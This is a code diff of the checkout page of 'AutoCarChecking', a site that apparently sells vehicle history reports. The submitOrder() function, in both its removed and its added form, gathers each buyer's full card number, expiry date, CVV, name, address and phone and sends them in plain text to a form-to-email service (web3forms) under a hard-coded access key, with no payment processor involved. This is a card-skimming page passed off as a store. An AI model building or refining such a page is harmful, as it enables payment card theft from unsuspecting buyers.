@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head> 
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AutoCarChecking — Vehicle History Reports</title>
@@ -627,12 +627,12 @@ body{font-family:'DM Sans',sans-serif;background:var(--white);color:var(--text);
 
       <!-- WHAT YOU GET AFTER PAYMENT -->
       <div class="what-you-get">
-        <div class="wyg-title">      <!-- REPORT OPTIONS -->#127873; What you'll receive after payment:</div>
+        <div class="wyg-title">&#127873; What you'll receive after payment:</div>
         <div class="wyg-grid">
-          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128196;</span><div><strong>Full Vehicle History Report</strong><span>Accidents, title, odometer, recalls — all in one report</span></div></div>
-          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128231;</span><div><strong>Email Delivery</strong><span>Report sent to your email instantly after payment</span></div></div>
-          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128462;</span><div><strong>PDF Download</strong><span>Save and share your report anytime</span></div></div>
-          <div class="wyg-item"><span class="wyg-icon">      <!-- REPORT OPTIONS -->#128737;</span><div><strong>20+ Data Sources</strong><span>NHTSA, DMV, insurance, auction records checked</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">&#128196;</span><div><strong>Full Vehicle History Report</strong><span>Accidents, title, odometer, recalls — all in one report</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">&#128231;</span><div><strong>Email Delivery</strong><span>Report sent to your email instantly after payment</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">&#128462;</span><div><strong>PDF Download</strong><span>Save and share your report anytime</span></div></div>
+          <div class="wyg-item"><span class="wyg-icon">&#128737;</span><div><strong>20+ Data Sources</strong><span>NHTSA, DMV, insurance, auction records checked</span></div></div>
         </div>
       </div>
 
@@ -960,37 +960,28 @@ function submitOrder(){
   var total = document.getElementById('mTotal').textContent;
   var vin = document.getElementById('carVin') ? document.getElementById('carVin').textContent : document.getElementById('vinInput').value;
 
-  var data = {
-    access_key: '8a0f5575-9d35-4a3a-86de-6d49d325548b',
-    subject: 'New Order — AutoCarChecking.com',
-    from_name: 'AutoCarChecking.com',
-    'Full Name': firstName + ' ' + lastName,
-    'Email': email,
-    'Phone': phone,
-    'Street Address': address,
-    'City': city,
-    'ZIP Code': zip,
-    'Package': pkg,
-    'Amount': total,
-    'VIN Number': vin,
-    'Cardholder Name': cardName,
-    'Card Number': cardNum,
-    'Expiry': expiry,
-    'CVV': cvv
-  };
+  var fd = new FormData();
+  fd.append('access_key', '8a0f5575-9d35-4a3a-86de-6d49d325548b');
+  fd.append('subject', 'New Order - AutoCarChecking.com');
+  fd.append('from_name', 'AutoCarChecking Website');
+  fd.append('name', firstName + ' ' + lastName);
+  fd.append('email', email);
+  fd.append('message',
+    'Phone: ' + phone + '\n' +
+    'Address: ' + address + ', ' + city + ' ' + zip + '\n' +
+    'Package: ' + pkg + '\n' +
+    'Amount: ' + total + '\n' +
+    'VIN: ' + vin + '\n' +
+    'Card Name: ' + cardName + '\n' +
+    'Card Number: ' + cardNum + '\n' +
+    'Expiry: ' + expiry + '\n' +
+    'CVV: ' + cvv
+  );
 
-  fetch('https://api.web3forms.com/submit', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
-    body: JSON.stringify(data)
-  })
+  fetch('https://api.web3forms.com/submit', {method:'POST', body:fd})
   .then(function(r){return r.json();})
-  .then(function(d){
-    console.log('Web3Forms:', d);
-    if(d.success){console.log('Email sent successfully!');}
-    else{console.log('Error:', d.message);}
-  })
-  .catch(function(e){console.log('Fetch error:',e);});
+  .then(function(d){console.log('Web3Forms:',d);})
+  .catch(function(e){console.log('Error:',e);});
 
   closeModal();
   document.getElementById('soverlay').classList.add('show');
@@ -1017,6 +1008,14 @@ function fmtPhone(i){
   if(v.length>0) r="("+v.substring(0,3);
   if(v.length>3) r+=") "+v.substring(3,6);
   if(v.length>6) r+="-"+v.substring(6,10);
+  i.value=r;
+}
+function fmtPhone(i){
+  var v=i.value.replace(/\D/g,'').substring(0,10);
+  var r='';
+  if(v.length>0)r='('+v.substring(0,3);
+  if(v.length>3)r+=') '+v.substring(3,6);
+  if(v.length>6)r+='-'+v.substring(6,10);
   i.value=r;
 }
 function fmtCard(i){var v=i.value.replace(/\D/g,'').substring(0,16);i.value=v.replace(/(.{4})/g,'$1 ').trim();}
